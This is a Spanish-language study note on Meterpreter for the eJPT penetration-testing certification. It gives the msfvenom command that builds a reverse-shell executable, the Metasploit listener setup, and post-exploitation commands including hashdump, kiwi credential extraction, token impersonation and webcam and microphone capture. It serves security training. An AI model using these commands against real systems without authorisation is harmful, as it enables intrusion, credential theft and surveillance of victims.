# Fundamentos de Meterpreter

## ¿Qué es Meterpreter?

**Meterpreter** es un payload avanzado utilizado dentro del framework de **Metasploit**.  
Proporciona una **shell interactiva** en la máquina víctima con capacidades avanzadas para post-explotación.

Se ejecuta en memoria (no toca disco), lo que lo hace más sigiloso frente a algunos antivirus.

---

## Características principales

- No crea un nuevo proceso (inyección en procesos existentes).
- Encriptado por defecto para evadir detección.
- Permite cargar módulos adicionales (`kiwi`, `incognito`, etc.).
- Compatible con comandos de post-explotación.

---

## ¿Cómo se obtiene una sesión Meterpreter?

1. A través de un **exploit exitoso** en `msfconsole` que lanza un payload tipo `meterpreter`.
2. Usando un ejecutable malicioso creado con `msfvenom`.
3. Aprovechando vectores como SMB, HTTP, RDP, etc.

---

## Tipos de payloads Meterpreter

```bash
msfvenom --list payloads | grep meterpreter
```

Algunos comunes:

- `windows/meterpreter/reverse_tcp`
- `windows/meterpreter/bind_tcp`
- `linux/x86/meterpreter/reverse_tcp`

---

## Ejemplo práctico de uso

### 1. Crear el payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<tu_puerto> -f exe > payload.exe
```

### 2. Listener en Metasploit

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
exploit
```

Cuando la víctima ejecuta el payload, se abre una sesión:

```bash
meterpreter >
```

---

## Comandos útiles de Meterpreter

| Comando             | Descripción                                       |
|---------------------|---------------------------------------------------|
| `sysinfo`           | Muestra información del sistema víctima           |
| `getuid`            | Muestra el usuario actual                         |
| `shell`             | Abre una shell de Windows/Linux en la víctima     |
| `upload`/`download` | Subir o bajar archivos                            |
| `ps`                | Lista procesos                                    |
| `migrate PID`       | Migra a otro proceso                              |
| `hashdump`          | Vuelca los hashes del sistema Windows             |
| `background`        | Envía la sesión a segundo plano                   |
| `sessions -i <id>`  | Recupera una sesión activa                        |

---

## Funcionalidades avanzadas (según privilegios)

- `load incognito`: Suplantación de tokens.
- `load kiwi`: Equivalente a Mimikatz (credenciales en memoria).
- `screenshare`, `screenshot`: Captura remota.
- `record_mic`, `webcam_snap`: Interacción con hardware.

---

## ¿Por qué es importante para el eJPT?

En el eJPT, Meterpreter puede ser usado para:

- Post-explotación básica (ver archivos, identificar usuarios).
- Enumerar la red interna.
- Subir herramientas auxiliares.
- Escalada de privilegios en escenarios controlados.

**No se espera que domines todos los módulos avanzados de Meterpreter**, pero sí debes:

- Saber crear un payload.
- Saber manejar una sesión.
- Saber extraer información útil de la víctima.

---

## Buenas prácticas

- Siempre usar `background` y `sessions -i` para manejar múltiples sesiones.
- Verifica si tienes privilegios elevados (`getuid`, `getprivs`).
- Ten cuidado al usar `shell` directamente: puede ser menos estable que los comandos nativos de Meterpreter.
